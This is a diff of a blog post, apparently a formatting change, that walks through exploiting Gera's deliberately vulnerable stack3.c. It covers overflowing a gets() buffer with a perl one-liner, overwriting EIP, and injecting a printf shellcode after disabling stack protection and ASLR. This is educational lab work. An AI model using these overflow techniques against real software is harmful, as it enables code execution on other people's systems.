@@ -31,21 +31,9 @@
     <div class="body">
           <h1>Gera's Warming Up on Stack #3 - Solutions</h1>
                   <p><a href="/posts/20130102_geras-wuos-stack2-solutions.html"> « </a>📅 published on <code>03/Jan/2013</code><a href="/posts/20130104_geras-wuos-stack4-solutions.html"> » </a></p>
-                <p>Following is the part 3 in the series of posts I started back in August
-2012 with an aim to provide an analysis and possible solutions for the
-vulnerable programs provided by
-<a href="http://corelabs.coresecurity.com/index.php?module=Wiki&amp;action=view&amp;type=researcher&amp;name=Gerardo_Richarte">Gera</a>
-at his <a href="http://community.corest.com/%7Egera/InsecureProgramming/">Insecure
-Programming</a>
-by example page.</p>
-<p>This post follows the <a href="/2013/1/2/geras-wuos-stack2-solutions/">Gera's Warming Up on Stack #2 -
-Solutions</a> post and if you have
-not read it, I request you to please do so. Most of the concepts are
-very similar and since they have been already talked about, I'll not be
-reiterating them here.</p>
-<p>Let's get started. Below is the source for the vulnerable
-<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>
-program:</p>
+                <p>Following is the part 3 in the series of posts I started back in August 2012 with an aim to provide an analysis and possible solutions for the vulnerable programs provided by <a href="http://corelabs.coresecurity.com/index.php?module=Wiki&amp;action=view&amp;type=researcher&amp;name=Gerardo_Richarte">Gera</a> at his <a href="http://community.corest.com/%7Egera/InsecureProgramming/">Insecure Programming</a> by example page.</p>
+<p>This post follows the <a href="https://7h3ram.github.io/posts/20130102_geras-wuos-stack2-solutions.html">Gera's Warming Up on Stack #2 - Solutions</a> post and if you have not read it, I request you to please do so. Most of the concepts are very similar and since they have been already talked about, I'll not be reiterating them here.</p>
+<p>Let's get started. Below is the source for the vulnerable <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a> program:</p>
 <pre><code class="c">/* stack3.c                                     *
  * specially crafted to feed your brain by gera */
 
@@ -61,19 +49,8 @@ int main() {
 }
 </code></pre>
 
-<p>The above program accepts user-input through the <code>gets</code> function and
-then looks for a specific value in a local variable named <code>cookie</code>. If
-this value is equal to a certain pre-defined constant, <code>printf</code> function
-is used to show a <code>you win!</code> message to the user. There is no direct
-means of modifying the content of the <code>cookie</code> variable. The <code>gets</code>
-function will keep reading from the stdin device until it encounters a
-newline or EoF character. Since this reading loop fails to honor the
-size of the destination buffer, a classic buffer overflow vulnerability
-is introduced in the program. Our aim is to leverage this vulnerability
-and exploit this program so that it print the <code>you win!</code> message to
-stdout.</p>
-<p>Here are a few observations that could be made by looking at the source
-of the program:</p>
+<p>The above program accepts user-input through the <code>gets</code> function and then looks for a specific value in a local variable named <code>cookie</code>. If this value is equal to a certain pre-defined constant, <code>printf</code> function is used to show a <code>you win!</code> message to the user. There is no direct means of modifying the content of the <code>cookie</code> variable. The <code>gets</code> function will keep reading from the stdin device until it encounters a newline or EoF character. Since this reading loop fails to honor the size of the destination buffer, a classic buffer overflow vulnerability is introduced in the program. Our aim is to leverage this vulnerability and exploit this program so that it print the <code>you win!</code> message to stdout.</p>
+<p>Here are a few observations that could be made by looking at the source of the program:</p>
 <ol>
 <li>Since it is defined prior to <code>buf</code>, the <code>cookie</code> would be placed at
     a higher memory address on the program stack, just below the saved
@@ -83,12 +60,7 @@ of the program:</p>
 <li>The <code>gets</code> call would accept unbounded user-input within <code>buf</code> array
     and hence it provides a mechanism to alter the call stack contents</li>
 </ol>
-<p>Stack layout for
-<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>
-is identical to
-<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a>
-as already outlined in the <a href="/2012/8/27/geras-wuos-stack1-solutions/">Gera's Warming Up on Stack #1 -
-Solutions</a> post.</p>
+<p>Stack layout for <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a> is identical to <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a> as already outlined in the <a href="https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html">Gera's Warming Up on Stack #1 - Solutions</a> post.</p>
 <p>Here are solutions I could think of to get the <code>you win!</code> message
 printed:</p>
 <ul>
@@ -113,9 +85,7 @@ flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat 
 </code></pre>
 
 <h2>Solution #1: Overflow the internal buf array to overwrite cookie with 0x01020005</h2>
-<p>Here's the GCC commandline to prepare
-<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>
-for this solution:</p>
+<p>Here's the GCC commandline to prepare <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a> for this solution:</p>
 <pre><code class="bash"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack3 stack3.c
 stack3.c: In function ‘main’:
 stack3.c:8: warning: incompatible implicit declaration of built-in function ‘printf’
@@ -125,18 +95,14 @@ stack3.c:8: warning: format ‘%08x’ expects type ‘unsigned int’, but argu
 stack3.c:(.text+0x27): warning: the `gets' function is dangerous and should not be used.
 </code></pre>
 
-<p>All done, let's exploit
-<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>:</p>
+<p>All done, let's exploit <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>:</p>
 <pre><code class="bash"># perl -e 'print &quot;A&quot;x80 . &quot;\x05\x00\x02\x01&quot;' | ./stack3
 buf: bfd625a4 cookie: bfd625f4
 you win!
 </code></pre>
 
 <h2>Solution #2: Overflow the internal buf array to overwrite EIP with the address of printf(you win!)</h2>
-<p>We need to have a look at the assembly of
-<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>
-and find out the location of the <code>printf</code> function which displays the
-<code>you win!</code> message:</p>
+<p>We need to have a look at the assembly of <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a> and find out the location of the <code>printf</code> function which displays the <code>you win!</code> message:</p>
 <pre><code class="bash"># objdump -d -M intel stack3 | grep -A20 main.:
 08048444 &lt;main&gt;:
  8048444:   55                      push   ebp
@@ -169,11 +135,7 @@ Segmentation fault
 </code></pre>
 
 <h2>Solution #3: Inject a NOP-prefixed printf(you win!) shellcode and overwrite EIP with its address</h2>
-<p>Let's first recompile
-<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>
-and request GCC to mark program stack as executable. Additionally, we
-also need to turn ASLR off so that we can have a static return address
-to overwrite EIP with:</p>
+<p>Let's first recompile <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a> and request GCC to mark program stack as executable. Additionally, we also need to turn ASLR off so that we can have a static return address to overwrite EIP with:</p>
 <pre><code class="bash"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack3 stack3.c 2&gt;/dev/null ; readelf -l stack3 | grep GNU_STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 #
@@ -181,12 +143,7 @@ to overwrite EIP with:</p>
 0
 </code></pre>
 
-<p>Now lets go ahead with exploitation. The Null-free, NOP-prefixed
-<code>printf(you win!)</code> shellcode we used to exploit
-<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a>
-in the <a href="/2012/8/27/geras-wuos-stack1-solutions/">Gera's Warming Up on Stack #1 -
-Solutions</a> post could be reused
-here:</p>
+<p>Now lets go ahead with exploitation. The Null-free, NOP-prefixed <code>printf(you win!)</code> shellcode we used to exploit <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a> in the <a href="https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html">Gera's Warming Up on Stack #1 - Solutions</a> post could be reused here:</p>
 <pre><code class="bash"># ./stack3
 buf: bffff4c4 cookie: bffff514
 #
@@ -214,18 +171,8 @@ buf: bffff4c4 cookie: bffff514
 you win!
 </code></pre>
 
-<p>So, we have now successfully exploited the
-<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>
-program through four different techniques. Depending on the motive of
-your exploitation attempt, other techniques could be devised and some,
-mentioned here, be rejected.</p>
-<p>Like I said, earlier, these solutions are not practical anymore. They
-just serve the purpose of understanding how exploits used to work before
-mitigation features were introduced in modern systems. But, as with
-everything else, understanding basics is really important. As mitigation
-features mature, exploitation techniques become increasingly complex.
-And to understand those, we need to build upon the solid foundation of
-basic concepts, like those discussed on this and other blogs.</p>
+<p>So, we have now successfully exploited the <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a> program through four different techniques. Depending on the motive of your exploitation attempt, other techniques could be devised and some, mentioned here, be rejected.</p>
+<p>Like I said, earlier, these solutions are not practical anymore. They just serve the purpose of understanding how exploits used to work before mitigation features were introduced in modern systems. But, as with everything else, understanding basics is really important. As mitigation features mature, exploitation techniques become increasingly complex. And to understand those, we need to build upon the solid foundation of basic concepts, like those discussed on this and other blogs.</p>
         <hr/>
         <p style="text-align:center;">(🔖 tagged <a href=/tags.html#buffer_overflow>buffer_overflow</a>, <a href=/tags.html#exploit>exploit</a>, <a href=/tags.html#mitigations>mitigations</a> and <a href=/tags.html#writeups>writeups</a>)</p>
                   <p style="text-align:center;">« <a href="/posts/20130102_geras-wuos-stack2-solutions.html">Gera's Warming Up on Stack #2 ...</a> « | » <a href="/posts/20130104_geras-wuos-stack4-solutions.html">Gera's Warming Up on Stack #4 ...</a> »</p>
